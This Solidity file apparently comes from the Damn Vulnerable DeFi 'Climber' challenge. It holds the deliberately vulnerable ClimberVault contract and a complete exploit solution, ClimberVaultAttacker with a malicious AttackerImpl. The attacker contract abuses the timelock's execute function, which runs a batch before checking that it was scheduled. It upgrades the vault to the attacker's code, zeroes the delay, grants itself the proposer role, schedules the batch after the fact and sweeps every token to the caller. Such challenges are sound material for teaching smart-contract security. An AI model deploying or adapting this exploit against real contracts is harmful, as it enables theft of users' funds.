// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "solady/src/utils/SafeTransferLib.sol";

import "./ClimberTimelock.sol";
import {WITHDRAWAL_LIMIT, WAITING_PERIOD, PROPOSER_ROLE} from "./ClimberConstants.sol";
import {CallerNotSweeper, InvalidWithdrawalAmount, InvalidWithdrawalTime} from "./ClimberErrors.sol";

/**
 * @title ClimberVault
 * @dev To be deployed behind a proxy following the UUPS pattern. Upgrades are to be triggered by the owner.
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract ClimberVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    modifier onlySweeper() {
        if (msg.sender != _sweeper) {
            revert CallerNotSweeper();
        }
        _;
    }

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }

    function initialize(address admin, address proposer, address sweeper) external initializer {
        // Initialize inheritance chain
        __Ownable_init();
        __UUPSUpgradeable_init();

        // Deploy timelock and transfer ownership to it
        transferOwnership(address(new ClimberTimelock(admin, proposer)));

        _setSweeper(sweeper);
        _updateLastWithdrawalTimestamp(block.timestamp);
    }

    // Allows the owner to send a limited amount of tokens to a recipient every now and then
    function withdraw(address token, address recipient, uint256 amount) external onlyOwner {
        if (amount > WITHDRAWAL_LIMIT) {
            revert InvalidWithdrawalAmount();
        }

        if (block.timestamp <= _lastWithdrawalTimestamp + WAITING_PERIOD) {
            revert InvalidWithdrawalTime();
        }

        _updateLastWithdrawalTimestamp(block.timestamp);

        SafeTransferLib.safeTransfer(token, recipient, amount);
    }

    // Allows trusted sweeper account to retrieve any tokens
    function sweepFunds(address token) external onlySweeper {
        SafeTransferLib.safeTransfer(token, _sweeper, IERC20(token).balanceOf(address(this)));
    }

    function getSweeper() external view returns (address) {
        return _sweeper;
    }

    function _setSweeper(address newSweeper) private {
        _sweeper = newSweeper;
    }

    function getLastWithdrawalTimestamp() external view returns (uint256) {
        return _lastWithdrawalTimestamp;
    }

    function _updateLastWithdrawalTimestamp(uint256 timestamp) private {
        _lastWithdrawalTimestamp = timestamp;
    }

    // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade
    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}
}

contract ClimberVaultAttacker {
    ClimberVault internal vault;
    ClimberTimelock internal timelock;
    AttackerImpl internal attackerImpl;
    address internal token;

    constructor(address _vault, address _token) {
        vault = ClimberVault(_vault);
        timelock = ClimberTimelock(payable(vault.owner()));
        attackerImpl = new AttackerImpl();
        token = _token;
    }

    function _getAttackData() internal view returns (address[] memory targets, uint256[] memory values, bytes[] memory dataElements, bytes32 salt) {
        targets = new address[](4);
        targets[0] = address(vault);
        targets[1] = address(timelock);
        targets[2] = address(timelock);
        targets[3] = address(this);

        values = new uint256[](4);

        dataElements = new bytes[](4);
        // a) transfer ownership of vault to player
        dataElements[0] = abi.encodeWithSignature("upgradeTo(address)", address(attackerImpl));
        // b) update delay to zero on timelock
        dataElements[1] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        // c) give permission to this contract to call schedule on timelock
        dataElements[2] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));
        // d) schedule this execution
        dataElements[3] = abi.encodeWithSignature("schedule()");
    }

    function attack() external {
        (address[] memory targets, uint256[] memory values, bytes[] memory dataElements, bytes32 salt) = _getAttackData();
        timelock.execute(targets, values, dataElements, salt);
        AttackerImpl(address(vault)).sweepFunds(token, msg.sender);
    }

    function schedule() external {
        (address[] memory targets, uint256[] memory values, bytes[] memory dataElements, bytes32 salt) = _getAttackData();
        timelock.schedule(targets, values, dataElements, salt);
    }
}

contract AttackerImpl is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    function sweepFunds(address token, address to) external {
        SafeTransferLib.safeTransfer(token, to, IERC20(token).balanceOf(address(this)));
    }

    // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade
    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}
}